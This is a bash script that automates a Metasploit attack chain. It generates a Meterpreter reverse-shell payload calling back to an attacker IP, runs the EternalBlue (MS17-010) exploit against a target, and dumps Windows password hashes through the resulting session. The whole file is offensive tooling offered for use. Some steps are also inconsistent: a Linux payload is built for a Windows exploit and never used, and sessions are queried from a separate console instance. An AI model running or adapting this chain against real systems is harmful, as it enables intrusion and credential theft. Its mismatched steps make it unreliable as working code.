#!/bin/bash

# Define variables for Metasploit payload
LHOST="10.0.2.8"  # Attacker's IP
LPORT="4444"       # Listener Port
OUTPUT="payload.elf" # Payload output file
RHOSTS="10.0.2.9"  # Target IP

# Step 1: Generate payload (optional, if not already created)
if [ ! -f $OUTPUT ]; then
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTPUT
  if [ $? -ne 0 ]; then
    echo "[!] Failed to generate payload"
    exit 1
  fi
  echo "[+] Payload generated as $OUTPUT"
else
  echo "[+] Using existing payload: $OUTPUT"
fi

# Step 2: Configure exploit for ms17_010_eternalblue
echo "use exploit/windows/smb/ms17_010_eternalblue" > metasploit_exploit.rc
echo "set RHOSTS $RHOSTS" >> metasploit_exploit.rc
echo "set LHOST $LHOST" >> metasploit_exploit.rc
echo "exploit -z" >> metasploit_exploit.rc

msfconsole -r metasploit_exploit.rc &

# Step 3: Wait for a valid session
echo "[+] Waiting for a valid Meterpreter session..."
sleep 10
SESSION_ID=$(msfconsole -x "sessions -l" | grep "meterpreter" | awk '{print $1}' | head -n 1)

if [ -z "$SESSION_ID" ]; then
  echo "[!] No valid session found. Exiting."
  exit 1
fi
echo "[+] Valid session found: ID $SESSION_ID"

# Step 4: Run hashdump module
echo "use post/windows/gather/hashdump" > metasploit_hashdump.rc
echo "set SESSION $SESSION_ID" >> metasploit_hashdump.rc
echo "run" >> metasploit_hashdump.rc

msfconsole -r metasploit_hashdump.rc

# Step 5: Add notes and loot to document the scan
echo "[+] Adding notes for the target $RHOSTS"
msfconsole -x "notes -h $RHOSTS -t exploit -a 'MS17-010 EternalBlue exploit executed.'"
msfconsole -x "notes -h $RHOSTS -t hashdump -a 'Hashdump module executed successfully.'"

echo "[+] Generating loot from the scan results."
msfconsole -x "loot -t csv"

echo "[+] Script execution completed."
